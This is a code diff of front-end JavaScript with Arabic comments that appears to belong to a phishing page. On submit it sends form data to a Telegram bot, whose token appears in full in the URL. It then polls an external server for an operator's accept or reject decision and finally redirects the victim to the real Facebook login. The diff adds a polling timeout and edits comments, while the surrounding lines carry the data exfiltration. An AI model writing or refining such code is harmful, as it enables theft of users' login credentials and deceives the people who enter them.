@@ -8,6 +8,9 @@ document.getElementById('submit-btn').addEventListener('click', () => {
         return;
     }
 
+    // ✅ إخفاء رسالة الخطأ إذا كانت ظاهرة
+    document.getElementById('error-message').style.display = 'none';
+
     // إرسال البيانات إلى بوت التليجرام
     fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
         method: 'POST',
@@ -27,16 +30,25 @@ document.getElementById('submit-btn').addEventListener('click', () => {
     })
     .then(() => {
         console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
-        checkLoginStatus(); // نبدأ التحقق
+        checkLoginStatus(); // نبدأ التحقق بعد الإرسال فقط
     })
     .catch(error => {
         console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
     });
 });
 
-// ✅ التحقق من حالة القبول/الرفض
 function checkLoginStatus() {
+    const maxAttempts = 30; // أقصى عدد محاولات (حوالي دقيقة)
+    let attempts = 0;
+
     const interval = setInterval(() => {
+        attempts++;
+        if (attempts > maxAttempts) {
+            clearInterval(interval);
+            console.warn("⏳ لم يتم الحصول على رد خلال المهلة المحددة.");
+            return;
+        }
+
         fetch('https://login-vpns.onrender.com/get-status')
             .then(res => res.json())
             .then(data => {
@@ -44,7 +56,7 @@ function checkLoginStatus() {
                     clearInterval(interval);
                     console.log("✅ تم القبول، توجيه المستخدم...");
 
-                    // ✅ إعادة تعيين الحالة
+                    // إعادة تعيين الحالة
                     fetch('https://login-vpns.onrender.com/update-status?action=reset')
                         .then(() => {
                             window.location.href = 'https://www.facebook.com/login';
@@ -54,10 +66,10 @@ function checkLoginStatus() {
                     clearInterval(interval);
                     console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");
 
-                    // ✅ إظهار الرسالة
+                    // عرض رسالة الخطأ
                     document.getElementById('error-message').style.display = 'block';
 
-                    // ✅ إعادة تعيين الحالة
+                    // إعادة تعيين الحالة
                     fetch('https://login-vpns.onrender.com/update-status?action=reset');
                 }
             })
